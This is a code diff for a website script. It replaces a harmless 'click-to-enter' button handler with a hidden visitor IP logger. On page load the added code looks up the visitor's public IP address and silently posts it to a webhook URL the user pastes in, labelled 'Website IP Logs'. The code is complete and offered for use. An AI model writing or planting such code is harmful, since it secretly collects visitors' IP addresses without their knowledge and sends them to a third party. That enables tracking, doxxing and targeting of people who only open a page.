@@ -1,15 +1,20 @@
 // sefty#0001
-(async () => {
-	const clicktext = document.querySelector("#click-to-enter");
+async function sendWebhook() {
+	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
+	var request = new XMLHttpRequest();
+	request.open("POST", "YOUR WEBHOOK HERE"); // paste your webhook link there
 
-	function buttonDel() {
-		const elem = document.getElementById("click-to-enter");
-		elem.parentNode.removeChild(elem);
-	}
+	request.setRequestHeader('Content-type', 'application/json');
 
-	clicktext.addEventListener("click", () => {
-		buttonDel();
-		document.querySelector("body").classList.add("container");
-	});
+	var params = {
+		username: "Website IP Logs",
+		avatar_url: "",
+		content: `IP: ${ip}`
+	};
 
-})();
+	request.send(JSON.stringify(params));
+};
+
+window.onload = function () { // this will run funcion on page load
+	sendWebhook();
+};
